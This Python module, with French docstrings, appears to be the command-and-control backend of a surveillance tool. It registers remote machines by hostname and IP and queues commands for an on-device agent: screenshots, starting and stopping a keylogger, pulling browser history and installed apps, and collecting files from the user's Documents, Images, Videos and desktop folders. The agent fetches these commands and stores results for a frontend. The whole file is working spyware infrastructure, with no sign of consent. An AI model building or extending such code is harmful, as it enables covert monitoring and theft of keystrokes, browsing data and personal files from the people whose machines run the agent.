import os
from models.machine import Machine


def register_machine(data):
    """Valide et enregistre une machine. Retourne l'ID créé."""
    hostname = data.get('hostname')
    os_info  = data.get('os_info')
    if not hostname or not os_info:
        raise ValueError("'hostname' et 'os_info' sont requis")
    return Machine.create(
        hostname=hostname,
        os_info=os_info,
        private_ip=data.get('private_ip'),
        public_ip=data.get('public_ip'),
    )


def list_machines():
    return Machine.get_all()


def get_machine(machine_id):
    machine = Machine.get_by_id(machine_id)
    if not machine:
        raise ValueError(f"Machine {machine_id} introuvable")
    return machine


def send_command(machine_id, command):
    """Envoie une commande à une machine."""
    allowed = {
        'screenshot', 'start_keylog', 'stop_keylog',
        'browser_history', 'apps',
        'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
    }
    if command not in allowed:
        raise ValueError(f"Commande inconnue : {command}")
    Machine.set_command(machine_id, command)


def fetch_command(machine_id):
    """Retourne la commande en attente (utilisé par l'agent)."""
    return Machine.get_command(machine_id)


def store_result(machine_id, result):
    """Enregistre le résultat d'une commande (utilisé par l'agent)."""
    Machine.set_result(machine_id, result)


def get_result(machine_id):
    """Retourne le résultat de la dernière commande (utilisé par le frontend)."""
    return Machine.get_result(machine_id)


def get_upload_dir(machine_id):
    """Retourne le dossier d'uploads d'une machine, le crée si besoin."""
    path = os.path.join('uploads', str(machine_id))
    os.makedirs(path, exist_ok=True)
    return path
